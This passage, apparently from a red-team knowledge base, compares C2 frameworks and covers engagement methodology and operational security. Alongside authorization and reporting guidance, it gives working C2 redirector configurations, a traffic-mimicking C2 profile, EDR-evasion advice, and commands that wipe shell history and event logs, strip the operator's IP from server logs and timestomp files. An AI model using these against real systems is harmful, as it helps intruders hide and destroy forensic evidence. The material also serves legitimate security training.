Multi-operator support\n\n**Strengths**: Extremely modular architecture. Best logging/auditing for compliance-heavy engagements. Multiple agent choices. Good for building custom agents within the framework. Strong purple team features.\n\n**Weaknesses**: Complexity (Docker dependency, container management). Agent quality varies by implementation. Higher resource requirements. Steeper learning curve.\n\n**Best For**: Large teams, compliance-focused engagements, organizations wanting framework flexibility.\n\n### Brute Ratel\n\n**Type**: Commercial ($2,500/year)\n\n**Agent**: Badger\n\n**Key Features**:\n- Designed specifically for EDR evasion\n- Indirect syscalls, stack spoofing\n- Sleep obfuscation\n- ETW/AMSI bypass\n- SMB/TCP for internal comms\n- Malleable profiles\n- Built-in keylogger, screenshot\n\n**Strengths**: Strong evasion capabilities out of the box. Less signatured than Cobalt Strike (smaller user base). Modern evasion techniques.\n\n**Weaknesses**: Smaller community. Less documentation. Leaked version increased detection coverage. Limited extensibility compared to CS/Mythic. Vendor lock-in.\n\n**Best For**: Teams focused on EDR evasion with budget for commercial tooling.\n\n### Nighthawk (MDSec)\n\n**Type**: Commercial (expensive, limited distribution)\n\n**Agent**: Custom\n\n**Key Features**: Advanced evasion, limited customer base (reduces signature coverage), MDSec research-backed techniques.\n\n**Best For**: Well-funded teams requiring maximum evasion. Limited public information on capabilities.\n\n### PoshC2\n\n**Type**: Open source (Python/PowerShell/C#)\n\n**Agent**: Multiple (PowerShell, C#, Python)\n\n**Key Features**:\n- Multiple implant types\n- Roslyn compiler integration for C# compilation\n- AMSI bypass\n- Comms over HTTP/HTTPS\n- Reporting features\n\n**Best For**: Quick penetration tests, PowerShell-heavy environments, smaller engagements.\n\n### Metasploit Framework\n\n**Type**: Open source (Ruby) + Pro (commercial)\n\n**Agent**: Meterpreter (multi-platform)\n\n**Key Features**:\n- Massive exploit/module library (2000+ exploits)\n- Multi-platform Meterpreter\n- Pivoting and routing\n- SOCKS proxy\n- Database integration\n- Extensive post-exploitation modules\n\n**Strengths**: Unmatched exploit library. Best for vulnerability exploitation phase. Excellent pivoting. Community support.\n\n**Weaknesses**: Heavily signatured. Meterpreter is caught by most EDR. Not designed for long-term C2 operations. Noisy default behavior.\n\n**Best For**: Vulnerability exploitation, initial access, lab environments, certification exams.\n\n### Vantablack (This Framework)\n\n**Key Features**:\n- Go agent with modular architecture\n- Indirect syscalls and sleep obfuscation\n- Multiple transport options\n- FastAPI team server with role-based auth\n- React UI with operator console\n- Integrated ATT&CK mapping and reporting\n- Adversary emulation playbooks\n- Reputation pre-warming for infrastructure\n- DGA for resilient C2 resolution\n- Customizable evasion chains\n\n**Best For**: Custom engagements requiring framework flexibility and modern evasion.\n\n### Selection Criteria\n\n| Factor | Recommendation |\n|--------|---------------|\n| Budget: $0 | Sliver, Havoc, Mythic |\n| Budget: $2,500-6,000 | Cobalt Strike, Brute Ratel |\n| Windows EDR evasion priority | Havoc, Brute Ratel, custom |\n| Cross-platform targets | Sliver, Mythic |\n| Large team / compliance | Mythic, Cobalt Strike |\n| Maximum stealth | Custom framework (Vantablack) |\n| Quick pentest | Metasploit + PoshC2 |\n| Purple team | Mythic (best logging) |\n\n### When to Build Custom\n\nBuild your own when:\n- Commercial frameworks are too signatured for your targets\n- You need specific transport protocols not available in existing tools\n- Engagement requires unique evasion techniques\n- Team has development capability and time investment is justified\n- Long-term operations where signature rotation is critical\n\nUse existing when:\n- Time-constrained engagement\n- Team lacks development resources\n- Commodity-level EDR is the target\n- Training and knowledge base are important\n- Exploit library is needed (Metasploit)\n\n### OpSec Notes\n\n- Every public framework has detection signatures — customization is always required\n- Cobalt Strike's leaked versions mean default configs are instantly detected\n- Open-source frameworks can be audited by defenders for detection development\n- Commercial frameworks with small customer bases (Nighthawk) have fewer signatures\n- Combining frameworks (Metasploit for initial access, custom C2 for persistence) is common\n- Always test framework traffic patterns against target's NDR/EDR in a lab before deployment\n\n---\n\n### AdaptixC2\n\nAdaptixC2 is a modern open-source C2 framework focused on modularity and extensibility:\n\n```\nKey features:\n- Written in Go (server) with Qt-based cross-platform GUI\n- Plugin-based agent extensions (BOF support)\n- Multiple transport channels: HTTP/S, DNS, SMB named pipes\n- Staged and stageless payload generation\n- Built-in post-exploitation modules\n- Multi-operator support with session sharing\n- Active development as of 2025/2026\n\nCompared to Sliver:\n- AdaptixC2: Qt GUI (native feel), more traditional CS-like workflow\n- Sliver: web-based console + CLI, larger community, more transports\n\nProject: github.com/Adaptix-Framework/AdaptixC2\n```\n\n### Updated Comparison Table (2026)\n\n| Feature | Cobalt Strike | Sliver | Havoc | Mythic | AdaptixC2 | BRc4 |\n|---------|--------------|--------|-------|--------|-----------|------|\n| Cost | $5,400/yr | Free | Free | Free | Free | ~$2,500/yr |\n| Language | Java (server) | Go | C/C++ | Python | Go | C++ |\n| GUI | Java Swing | Web+CLI | Qt | Web | Qt | Electron |\n| BOF Support | Yes | Yes | Yes | Via agents | Yes | Yes |\n| Sleep Masking | Yes (CS4.9+) | Partial | Yes | Varies | Partial | Yes |\n| EDR Evasion | Excellent | Good | Excellent | Variable | Good | Excellent |\n| Detection Risk | High (signatures) | Medium | Medium | Low-Med | Low | Low |\n| OPSEC | Excellent (if configured) | Good | Good | Good | Good | Excellent |\n| Active Dev | Yes | Yes | Yes | Yes | Yes | Yes |\n| Community | Large | Large | Growing | Large | Small | Small |\n\n## ◈ ADVANCED\n\n### Framework Selection by Engagement Type (2026)\n\nThe right tool depends on the target environment and detection capability:\n\n```\nTarget: Mature enterprise with CrowdStrike Falcon Complete + XDR\n→ Do NOT use: default Cobalt Strike, default Sliver (both heavily signatured)\n→ USE: Custom-compiled Havoc with modified reflective loader + custom sleep mask\n OR: Vantablack with Go agent (no PE structure → harder to signature)\n OR: Cobalt Strike with fully custom malleable profile + CS Arsenal BOFs\n\nTarget: Mid-market with Windows Defender + limited EDR\n→ USE: Sliver (good balance of features + evasion), or PoshC2 for quick engagements\n\nTarget: Cloud-first org (M365, Entra ID, AWS)\n→ USE: Framework agnostic — focus on cloud identity attacks\n C2 may be unnecessary if access is via stolen tokens/OAuth apps\n Use AADInternals, ROADtools, PowerZure for cloud-specific operations\n\nTarget: Linux-heavy (containers, Kubernetes)\n→ USE: Sliver (best Linux/macOS support), or custom Go/Python agent\n Havoc/BRc4 are Windows-only; irrelevant for Linux-primary targets\n```\n\n### Building Detection-Resistant Custom Agents\n\nWhen public frameworks are too signatured, build custom:\n\n```\nKey design principles for 2026 EDR resistance:\n\n1. Language choice:\n - Go: no standard PE structure → fewer static signatures; GC complicates memory analysis\n - Rust: minimal runtime, no CRT → fewer dependencies to hook\n - Avoid: C# (CLR is heavily monitored), PowerShell (AMSI hooks all execution)\n\n2. Compilation hardening:\n - Strip symbols: -ldflags=\"-s -w\" (Go)\n - Compile-time string encryption (gobfuscate, garble)\n - Per-engagement recompile with different constants/keys\n\n3. Memory footprint:\n - No PE on disk if possible (reflective injection from another process)\n - Encrypted-at-rest when sleeping (XOR or AES with derived key)\n - Avoid large memory allocations that trigger size-based heuristics\n\n4. Communication:\n - Use legitimate cloud APIs (Graph, S3, GCS) as C2 channel → traffic is valid API calls\n - Never hardcode C2 server IP — use DGA or DNS-based resolution\n```\n\n### Framework Operational Chaining\n\nFor complex engagements, chain multiple frameworks:\n\n```\nPhase 1 (Initial Access): Metasploit for exploitation\n → exploit delivers shellcode that executes stageless Sliver implant\n\nPhase 2 (Persistence + Internal Recon): Sliver\n → network recon, BloodHound collection, basic post-exploitation\n\nPhase 3 (High-Value Targets): Custom Vantablack agent\n → deploy only to high-value systems (DC, financial servers)\n → smaller footprint, less likely to be caught on critical assets\n → separate C2 channel (DNS over HTTPS vs HTTP)\n\nPhase 4 (Data Staging): Cloud-native exfil\n → use compromised M365/AWS credentials to push data to attacker-controlled storage\n → no C2 traffic needed for exfil — looks like SaaS sync\n\nValue: each framework uses different signatures → burning one doesn't burn all\n```\n\n### Emerging Frameworks (2026)\n\n```\nVantablack (this framework):\n- Purpose-built for 2026 EDR landscape\n- Go agent: no CRT dependency, compile-time obfuscation\n- Cloud API C2 channels (OneDrive, Graph API)\n- Integrated evasion chain automation\n- ATT&CK-mapped reporting built-in\n\nEmerging technique: AI-assisted C2\n- LLM-based command dispatch: natural language → structured C2 tasks\n- Anomaly-resistant communication: vary C2 format per session using LLM generation\n- Behavioral synthesis: implant behavior adapts based on host OS/environment fingerprint\n\nTrend: C2 moving away from dedicated infrastructure toward abuse of legitimate services\n- Teams/Slack/Discord webhooks as C2 channels\n- GitHub issues/commits for command delivery\n- Google Sheets for task queue\nEach requires no attacker-owned infrastructure → harder to block/detect\n```", "last_updated": "2026-03-18"}, "engagement-methodology": {"slug": "engagement-methodology", "title": "Red Team Engagement Methodology", "category": "Red Team Ops", "content": "# Red Team Engagement Methodology\n\n## ◈ BEGINNER\n\n### What Is Red Team Engagement Methodology?\n\nA **red team engagement** is a structured adversary simulation that tests an organization's ability to detect and respond to a real attack. Unlike penetration testing (which finds vulnerabilities), red teaming simulates a full attack chain — from initial access through to achieving specific objectives — mimicking the tactics, techniques, and procedures (TTPs) of real threat actors.\n\n**Why structure matters:** Without a methodology, red team engagements become chaotic, legally risky, and hard to report. Structure ensures you operate within authorized boundaries, document every action for deconfliction, and produce a report that drives real security improvements.\n\n**Key terms:**\n- **Rules of Engagement (ROE)** — the written agreement defining what is in scope, what is out of scope, and what methods are authorized; the legal foundation of every engagement\n- **Crown jewels** — the primary objectives of the engagement: the specific systems, data, or access levels that represent the most critical assets\n- **Deconfliction** — the process of distinguishing red team activity from real threat actor activity when the blue team detects something; requires detailed logs\n- **Get-out-of-jail letter** — a signed document from authorized leadership authorizing the red team's activities; essential for physical assessments or if law enforcement is contacted\n- **MITRE ATT&CK** — a framework of adversary tactics and techniques; used to map red team actions to real-world threat actor behavior for comparison\n- **Foothold** — initial persistent access to the target network; the first callback from a deployed implant\n- **Lateral movement** — moving from the initial access point toward the target (crown jewels) by compromising additional systems\n- **ATT&CK Navigator** — a web-based tool for visualizing which MITRE ATT&CK techniques were tested and which the blue team detected\n- **Purple team** — a collaborative mode where red and blue team work together in real time; red team executes techniques, blue team validates detection capability\n- **C2 (Command and Control)** — the infrastructure the red team uses to issue commands to compromised systems and receive results\n\n**The engagement lifecycle:**\n```\nPre-engagement → Recon → Initial Access → Establish Foothold → Internal Recon →\nPrivilege Escalation → Lateral Movement → Objective Achievement → Cleanup → Reporting\n```\n\n**Analogy:** A red team engagement is like a fire drill — except instead of testing if people can exit the building, you're testing if the security team can detect, contain, and respond to a skilled attacker before they reach the vault. The \"fire\" is simulated but the detection and response capability is measured for real.\n\n## ◈ INTERMEDIATE\n\nStructured methodology for planning, executing, and reporting red team engagements.\n\n### Phase 1: Scoping and Planning\n\n#### Rules of Engagement (ROE)\n\nDefine before any activity begins:\n\n```\n- Scope: which systems, networks, users are in/out of scope\n- Crown jewels: primary objectives (domain admin, specific data, PCI systems)\n- Out-of-scope: critical systems, production databases, third-party infrastructure\n- Timing: engagement window, blackout periods, business hours restrictions\n- Methods: allowed techniques (social engineering, physical, network, application)\n- Notification: who knows about the engagement (CEO, CISO, legal, SOC lead)\n- Deconfliction: procedure when blue team detects activity\n- Emergency contacts: escalation path for unexpected situations\n- Data handling: how to handle sensitive data encountered during testing\n- Legal: authorization letters, signed contracts, get-out-of-jail letter\n```\n\n#### Threat Intelligence Gathering\n\nResearch the target's:\n- Industry and regulatory environment\n- Known threat actors targeting the industry\n- Technology stack (job postings, LinkedIn, DNS, Shodan)\n- Security posture (published security certifications, breach history)\n- Organizational structure (key personnel, departments, locations)\n\n#### Attack Planning\n\nBased on threat intel, develop attack paths:\n```\nPath A (Primary): Phishing → Foothold → AD Escalation → Crown Jewel\nPath B (Backup): Web App Exploitation → Internal Pivot → Data Access\nPath C (Physical): Social Engineering → Physical Access → Network Access\n```\n\n#### Infrastructure Build-Out\n\n30+ days before engagement:\n1. Purchase and categorize domains\n2. Deploy VPS infrastructure (staging, C2, redirectors)\n3. Configure SSL certificates\n4. Build and test malleable C2 profiles\n5. Prepare payload arsenal (test against target's known EDR)\n6. Set up phishing infrastructure (mail servers, landing pages)\n7. Configure logging and evidence collection\n\n### Phase 2: Execution\n\n#### Initial Access\n\n```\nWeeks 1-2: External reconnaissance and initial access attempts\n- Execute phishing campaigns\n- Test web application attack vectors\n- Attempt credential attacks (spraying, stuffing)\n- Try physical/social engineering if in scope\n```\n\n#### Establish Foothold\n\n```\nImmediate priorities after first callback:\n1. Stabilize access (deploy persistent implant)\n2. Install redundant persistence (2-3 mechanisms)\n3. Establish backup C2 channels\n4. Begin internal reconnaissance\n```\n\n#### Internal Reconnaissance\n\n```\n- Network mapping (ARP, ICMP, port scanning)\n- Active Directory enumeration (BloodHound)\n- Share enumeration (sensitive file discovery)\n- Service enumeration (databases, web apps, legacy systems)\n- Credential hunting (config files, memory, stored passwords)\n```\n\n#### Privilege Escalation\n\n```\n- Local privesc (misconfigurations, unpatched vulnerabilities)\n- AD attack paths (Kerberoasting, DACL abuse, delegation)\n- Token impersonation\n- Credential extraction and reuse\n```\n\n#### Lateral Movement\n\n```\n- Move toward crown jewel assets\n- Establish presence in multiple network segments\n- Maintain operational tempo (not too fast, not too slow)\n- Document each pivot for the attack narrative\n```\n\n#### Objective Completion\n\n```\n- Access crown jewel assets as defined in ROE\n- Capture evidence (screenshots, data samples, access proof)\n- Document the complete attack chain\n- Do NOT exfiltrate real sensitive data unless specifically authorized\n```\n\n### Phase 3: Cleanup and Reporting\n\n#### Cleanup Procedure\n\n```bash\n# For each compromised system:\n1. Remove persistence mechanisms (in reverse order of installation)\n2. Delete dropped files and tools\n3. Remove created accounts\n4. Restore modified configurations\n5. Verify cleanup (re-check system for artifacts)\n6. Document what was removed and what remains\n```\n\n#### Evidence Collection\n\nMaintain throughout the engagement:\n- Screenshots of access to crown jewels\n- Command output logs (timestamped)\n- Network diagrams showing attack path\n- Credential material found (hashes, not plaintext)\n- Security misconfigurations identified\n\n#### Report Structure\n\n```\n1. Executive Summary (1-2 pages)\n - Engagement overview\n - Key findings (business impact language)\n - Risk ratings\n - Top recommendations\n\n2. Technical Findings\n - Each finding includes:\n - Description\n - Impact and risk rating\n - Evidence (screenshots, logs)\n - MITRE ATT&CK mapping\n - Remediation recommendation\n - Detection opportunity\n\n3. Attack Narrative\n - Chronological story of the engagement\n - Decision points and reasoning\n - What worked and what didn't\n - Time spent on each phase\n\n4. ATT&CK Navigator Layer\n - Visual mapping of techniques used\n - Coverage gaps identified\n - Detection vs non-detection for each technique\n\n5. Remediation Roadmap\n - Prioritized recommendations\n - Quick wins vs long-term improvements\n - Architecture-level recommendations\n\n6. Appendices\n - Full tool list\n - IOC list for deconfliction\n - Raw evidence\n - Methodology reference\n```\n\n### Operator Roles\n\n| Role | Responsibility |\n|------|---------------|\n| Lead Operator | Overall execution, decision-making, client communication |\n| Support Operator | Technical execution, tooling, infrastructure management |\n| Report Writer | Evidence collection, finding documentation, final report |\n| Infrastructure Manager | C2 and redirector management, monitoring |\n\n### Communication Protocols\n\n- **Daily check-ins**: Status update between operators\n- **Weekly client updates**: High-level progress (if agreed in ROE)\n- **Abort signal**: Predefined procedure to halt all activity immediately\n- **Deconfliction**: Contact procedure when blue team escalates an incident\n- **Evidence handling**: Encrypted storage, access controls, deletion timeline\n\n### Purple Team Integration Points\n\nIf operating as purple team:\n- Pre-brief detection team on technique categories (not specifics)\n- Execute technique → allow detection time → review detection capability\n- Document detection gaps and successes\n- Collaborate on detection rule development\n- Iterate: improve detection → re-test with modified technique\n\n### ATT&CK Mapping\n\nMap every action to MITRE ATT&CK throughout the engagement:\n\n```\nT1566.001 - Phishing: Spearphishing Attachment\nT1059.001 - Command and Scripting Interpreter: PowerShell\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1078.002 - Valid Accounts: Domain Accounts\nT1003.001 - OS Credential Dumping: LSASS Memory\nT1021.002 - Remote Services: SMB/Windows Admin Shares\n```\n\nUse ATT&CK Navigator to generate visual heatmaps of technique coverage.\n\n### OpSec Notes\n\n- Maintain detailed logs for every action — critical for deconfliction and reporting\n- Never exceed the scope defined in the ROE\n- If you discover real threat actor activity, stop and notify the client immediately\n- Handle sensitive data according to contractual obligations\n- Ensure all infrastructure is decommissioned after engagement completion\n- Retain evidence per contractual retention period, then securely destroy\n\n## ◈ ADVANCED\n\n### Assumed Breach Engagements\n\nInstead of starting from initial access, assumed breach starts with a pre-positioned implant on an internal workstation. This tests the \"right side\" of ATT&CK — detection of lateral movement, privilege escalation, and data access — without burning weeks on phishing:\n\n```\nSetup:\n- Client places a pre-authorized implant on a standard workstation (Tier 1 helpdesk user)\n- Red team receives callback from that implant\n- Red team then proceeds: internal recon → AD attacks → crown jewel access\n\nValue:\n- Tests internal detection controls that initial access bypasses test\n- Faster time-to-objectives → more lateral movement and persistence testing per engagement\n- Directly simulates attacker who got in via supply chain, insider threat, or already-phished user\n- Maps precisely to cloud-era threat models (many breaches now start from cloud identity compromise, not malware)\n```\n\n### Objective-Based vs Technique-Based Engagements\n\n**Objective-based:** Reach the crown jewel (Domain Admin, specific database, finance system). Operator chooses the most efficient path. Tests holistic defense.\n\n**Technique-based (adversary emulation):** Execute specific TTPs from a named threat actor's playbook (APT29, FIN7, Lazarus Group). Tests whether defenses detect those specific behaviors.\n\n```bash\n# Threat actor playbook sources:\n# MITRE ATT&CK Groups: attack.mitre.org/groups/\n# CISA advisories: cisa.gov/known-exploited-vulnerabilities-catalog\n# Mandiant APT profiles, CrowdStrike adversary reports\n\n# Atomic Red Team: single-technique test library\nInvoke-AtomicTest T1003.001 # LSASS dump\nInvoke-AtomicTest T1059.001 # PowerShell execution\n\n# CALDERA: automated adversary emulation\n# Deploy CALDERA server → configure adversary → run automated TTPs\n# Produces ATT&CK Navigator layer of executed vs detected techniques\n```\n\n### Multi-Operator Workflows\n\nFor engagements with 3+ operators, divide labor by specialization:\n\n```\nPhase 1 (recon + initial access): Operator A\n - External recon, phishing, web app testing\n - Hands off callback to Phase 2 when foothold established\n\nPhase 2 (internal ops): Operator B\n - Internal recon, BloodHound analysis, AD attack paths\n - Runs to Domain Admin\n\nPhase 3 (objectives + persistence): Operator C\n - Access crown jewels, establish persistent footholds\n - Evidence collection, reporting artifacts\n\nInfrastructure: Operator D (separate role)\n - Monitors C2 infrastructure health\n - Rotates burned domains/redirectors\n - Evidence log management\n\nCoordination: Slack/Signal with engagement-specific channel\n- Never use client infrastructure for team comms\n- Daily async check-in + real-time for major events\n```\n\n### Engagement Replay and Validation\n\nAfter initial engagement: replay detected techniques with modifications to test blue team adaptation:\n\n```\nRound 1: Execute technique as-is (e.g., Rubeus Kerberoasting)\nBlue team detects → documents detection signature\n\nRound 2: Modify to test detection resilience\n- Same technique, different tool (impacket GetUserSPNs)\n- Same technique, renamed binary\n- Same technique, inline reflective execution (no binary)\n\nThis tests whether detection is:\n- Signature-based (misses modified tool) — weak detection\n- Behavior-based (catches all variants) — strong detection\n- Coverage gap (misses everything) — finding to report\n\nDocument each variant's detection outcome in the ATT&CK Navigator layer\n```", "last_updated": "2026-03-18"}, "opsec": {"slug": "opsec", "title": "Operational Security for Red Teams", "category": "Red Team Ops", "content": "# Operational Security for Red Teams\n\n## ◈ BEGINNER\n\n### What Is OPSEC for Red Teams?\n\n**Operational Security (OPSEC)** for red teams means protecting your own activity from being attributed, traced, or disrupted before you achieve your objectives. A red team that gets caught too early hasn't measured the blue team's detection capability at depth — it's just measured their perimeter alerting. Good OPSEC lets you operate long enough to reach the crown jewels and demonstrate real business impact.\n\n**Key terms:**\n- **Infrastructure separation** — using different servers, domains, and IPs for different operational purposes (staging vs C2 vs phishing); compromise of one doesn't expose others\n- **Redirector** — a proxy server that sits between the implant and the teamserver; if the redirector is discovered and blocked, the teamserver remains hidden\n- **Domain fronting** — routing C2 traffic through a major CDN (Cloudflare, Azure) so the network sees CDN IP addresses, not attacker infrastructure\n- **Malleable C2 profile** — configuration that shapes the implant's traffic to look like a legitimate application (Microsoft Teams sync, Google Analytics, etc.)\n- **Attribution avoidance** — never reusing infrastructure, accounts, or signatures across engagements; prevents cross-client correlation\n- **Timestomping** — modifying file creation/modification timestamps to match legitimate system files and avoid forensic timeline anomalies\n- **Kill switch** — a mechanism to remotely instruct all implants to remove themselves and clean up; essential for rapid engagement end\n- **JA3 fingerprint** — a hash of TLS handshake parameters; network monitoring tools use it to identify specific tools by their TLS fingerprint\n- **Deconfliction** — the process of proving red team activity vs real threat actor activity; requires detailed timestamped logs of every action\n- **Counter threat intelligence** — monitoring whether your own infrastructure appears in threat intel feeds (VirusTotal, URLScan); rotate immediately if detected\n\n**The OPSEC failure modes that burn operations:**\n- Scanning from your C2 server (Shodan will index it)\n- Using default tool user-agent strings (immediately signatured)\n- Clearing all event logs (more suspicious than the attack itself)\n- Testing payloads on VirusTotal before deployment (shares with all AV vendors)\n- Reusing infrastructure across engagements (cross-client attribution)\n\n**Analogy:** OPSEC is the operational version of leaving no fingerprints. A skilled burglar doesn't just avoid leaving fingerprints at the scene — they drive a rental car, wear non-distinctive clothing, pay cash, and plan their route to avoid cameras. Each layer reduces the probability of attribution.\n\n## ◈ INTERMEDIATE\n\nOPSEC principles and practices for conducting red team engagements without premature detection or attribution.\n\n### Infrastructure Separation\n\nCategorize infrastructure by function and never reuse across categories:\n\n| Layer | Purpose | Examples |\n|-------|---------|---------|\n| Staging | Initial payload hosting, phishing landing | Short-lived VPS, S3 buckets |\n| Short-haul | First-stage C2, initial callback | Redirectors with 7-day rotation |\n| Long-haul | Persistent C2, primary implant management | Aged domains, CDN-fronted |\n| Phishing | Email delivery, credential harvesting | Dedicated mail servers, SendGrid |\n| Redirectors | Traffic filtering, blue team deflection | Nginx/Apache/Cloudflare Workers |\n\nEach layer uses separate VPSes, domains, and certificates. Compromise of one layer does not expose others.\n\n### Redirector Chains\n\n```\nImplant → CDN (Cloudflare) → Redirector 1 (nginx) → Redirector 2 (socat) → C2 Server\n```\n\nRedirector configuration (nginx):\n```nginx\nserver {\n listen 443 ssl;\n ssl_certificate /etc/letsencrypt/live/redirect.com/fullchain.pem;\n ssl_certificate_key /etc/letsencrypt/live/redirect.com/privkey.pem;\n\n # Only allow expected C2 traffic patterns\n location /api/v1/ {\n # Validate User-Agent, headers, etc.\n if ($http_user_agent !~* \"Mozilla/5.0\") {\n return 404;\n }\n proxy_pass https://c2-server:443;\n proxy_ssl_verify off;\n }\n\n # Default: return legitimate-looking content\n location / {\n return 302 https://www.microsoft.com;\n }\n}\n```\n\n### Domain Management\n\n- **Purchase 30+ days before engagement** — fresh domains are flagged\n- **Categorize via reputation services**: Submit to Cloudflare, Bluecoat/Symantec, McAfee, Palo Alto URL categorization\n- **Match target industry**: Use domains that look like industry-relevant services (HR platform, cloud service, collaboration tool)\n- **SSL certificates immediately**: Let's Encrypt — certificate age is checked by some security products\n- **Realistic WHOIS**: Use privacy protection or realistic registrant info\n\n### Malleable C2 Profiles\n\nConfigure traffic to match legitimate applications used by the target:\n\n```\n# Research phase: identify which cloud services the target uses\n# (DNS records, Office 365, Slack, Salesforce, etc.)\n# Build malleable profile mimicking that specific traffic pattern\n\n# Key elements to match:\n# - URI patterns\n# - HTTP headers (User-Agent, Accept, Content-Type)\n# - Request/response sizes\n# - TLS fingerprint (JA3)\n# - Cookie behavior\n# - Timing patterns\n```\n\n### Operational Timeline\n\n- **Activity hours**: Match target organization's business hours and timezone\n- **Holiday awareness**: Reduced staffing = higher detection risk (anomalous after-hours activity)\n- **Phased approach**: Reconnaissance → Initial Access → Establish Foothold → Internal Recon → Escalation → Objectives\n- **No rushing**: Allow time between phases for defender response assessment\n\n### Agent OpSec\n\n- Delete dropped artifacts immediately after use\n- Clear event logs selectively (clearing all logs is more suspicious than clearing none)\n- Timestomp files to match surrounding directory (match creation/modification times)\n- Avoid noisy modules in production — test in lab environment first\n- Prefer in-memory operations over disk writes\n- Use sleep obfuscation with memory encryption during idle periods\n- Implement execution guardrails (only run in target environment)\n\n### Attribution Avoidance\n\n- **Dedicated VMs per engagement**: No cross-contamination between clients\n- **No personal accounts**: Separate browsers, VPN accounts, email for infra management\n- **Anonymous infrastructure purchasing**: Cryptocurrency or prepaid cards for VPS/domains\n- **VPN/Tor for infra management**: Never access C2 infrastructure from personal IP\n- **Unique signatures per engagement**: Don't reuse implant signatures, user agents, or C2 profiles across clients\n- **Watermarking**: Include unique identifiers per client/engagement for post-incident deconfliction\n\n### Kill Switch and Cleanup\n\nPlan cleanup procedures before engagement begins:\n\n```\nCleanup checklist:\n[ ] Remove all persistence mechanisms\n[ ] Delete staged/dropped files\n[ ] Remove created user accounts\n[ ] Restore modified registry keys\n[ ] Remove scheduled tasks\n[ ] Delete created services\n[ ] Clear relevant event log entries\n[ ] Remove firewall rule modifications\n[ ] Delete shadow copies created\n[ ] Remove GPO modifications\n[ ] Document all changes for client report\n```\n\nImplement a kill switch: ability to remotely instruct all implants to self-destruct, remove persistence, and exit cleanly.\n\n### Counter Threat Intelligence\n\n- Never reuse C2 infrastructure across engagements\n- Rotate implant build artifacts (compile timestamps, PE metadata, strings)\n- Monitor threat intel feeds for your own infrastructure (VirusTotal, URLScan, Shodan)\n- Use unique code signing certificates per engagement\n- Avoid public scanning (Shodan, Censys) of C2 infrastructure\n- Check domain reputation before use (VirusTotal, URLVoid, Cisco Talos)\n\n### Logging and Deconfliction\n\nMaintain detailed operator logs:\n\n```\nTimestamp | Operator | Action | Source IP | Target | Result | Notes\n2024-01-15 09:30 | op1 | phish_send | 203.0.113.5 | user@target.com | delivered | campaign_id:001\n2024-01-15 10:15 | op1 | callback | 203.0.113.5 | 10.0.0.50 | foothold | beacon_id:abc123\n```\n\nDeconfliction ensures red team activity can be distinguished from real threat actor activity. Include:\n- All IPs used\n- All domains used\n- All user accounts created\n- All files dropped\n- Timestamps of all activity\n\n### Peer Review\n\nBefore executing any phase:\n- Second operator reviews attack plan\n- Validate tool configurations in lab\n- Confirm scope boundaries and ROE\n- Verify emergency contact procedures\n- Test cleanup procedures\n\n### OpSec Failures to Avoid\n\n| Mistake | Consequence |\n|---------|------------|\n| Reusing infrastructure | Cross-client attribution |\n| Scanning from C2 IP | C2 server discovered via Shodan |\n| Default User-Agent strings | Immediate signature match |\n| Aggressive scanning | IDS/IPS alerts, IP blocks |\n| Dropping known tools to disk | AV detection, burned operation |\n| Clearing all event logs | More suspicious than the attack itself |\n| Testing payloads on VirusTotal | Sample shared with all AV vendors |\n| Using personal VPN | Attribution to operator |\n\n### Infrastructure Layering\n\nA properly architected operation uses multiple layers between the operator and the target:\n\n```\nOperator → VPN/Tor → Redirector 1 (CDN/Cloud) → Redirector 2 (VPS) → Teamserver\n ↑\n ← Agent check-in\n```\n\nEach layer adds a hop that must be traced for attribution. CDN fronting makes the redirector IP appear as a legitimate CDN (Cloudflare, Azure, Fastly) to network defenders.\n\n#### Cloudflare Worker as Redirector\n\nProxies C2 traffic and only forwards requests with the correct path prefix:\n\n```javascript\naddEventListener('fetch', event => {\n event.respondWith(handleRequest(event.request))\n})\n\nasync function handleRequest(request) {\n const url = new URL(request.url)\n // Only forward C2 check-in paths\n if (!url.pathname.startsWith('/api/agent')) {\n return new Response('Not found', { status: 404 })\n }\n const targetURL = 'https://your-teamserver-ip' + url.pathname + url.search\n return fetch(targetURL, {\n method: request.method,\n headers: request.headers,\n body: request.body\n })\n}\n```\n\n#### socat Redirector (Simple TCP Proxy)\n\n```bash\n# Redirect all port 443 traffic to teamserver\nsocat TCP4-LISTEN:443,fork TCP4:TEAMSERVER_IP:443 &\n\n# With SSL stripping (agent uses HTTP, redirector adds TLS)\nsocat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP4:TEAMSERVER_IP:8080 &\n```\n\n### Malleable C2 Profile Design\n\nTraffic profiles define how C2 communications blend with legitimate traffic:\n\n```\nset sleeptime \"60000\"; # 60 second check-in\nset jitter \"20\"; # ±20% randomization\nset useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\";\n\nhttp-get {\n set uri \"/cdn-cgi/challenge-platform/h/g/orchestrate/chl_api/v1\";\n client {\n header \"Accept\" \"application/json, text/plain, */*\";\n header \"Accept-Language\" \"en-US,en;q=0.9\";\n header \"Referer\" \"https://www.cloudflare.com/\";\n metadata {\n base64url;\n prepend \"cf_clearance=\";\n header \"Cookie\";\n }\n }\n}\n```\n\nProfile the target network before the engagement — capture legitimate HTTPS traffic and mirror the User-Agents, headers, and URI patterns in use.\n\n### Evidence Sanitization\n\nDuring and after the operation:\n\n```bash\n# Clear bash history (Linux)\nhistory -c && history -w\nunset HISTFILE\nexport HISTFILESIZE=0\n\n# PowerShell history (Windows)\nRemove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue\n\n# Windows event log clearing (noisy — triggers alert)\nwevtutil cl System && wevtutil cl Security && wevtutil cl Application\n# Better: selectively delete specific Event IDs using wevtutil\nwevtutil qe Security /rd:true /f:xml /q:\"*[System[(EventID=4624)]]\" | Select-String EventRecordID\n\n# Linux: targeted log cleanup without clearing all logs\nsed -i '/your-source-ip/d' /var/log/auth.log\nsed -i '/your-source-ip/d' /var/log/nginx/access.log\n# Note: sed -i modifies atime/mtime — use touch to reset\ntouch -r /var/log/auth.log.bak /var/log/auth.log\n```\n\n### Timestomping\n\nModify file timestamps to blend with existing filesystem artifacts:\n\n```powershell\n# PowerShell timestomping\n$file = Get-Item \"C:\\Windows\\Temp\\svc.exe\"\n$refFile = Get-Item \"C:\\Windows\\System32\\svchost.exe\"\n$file.CreationTime = $refFile.CreationTime\n$file.LastWriteTime = $refFile.LastWriteTime\n$file.LastAccessTime = $refFile.LastAccessTime\n```\n\n```bash\n# Linux: set timestamp to 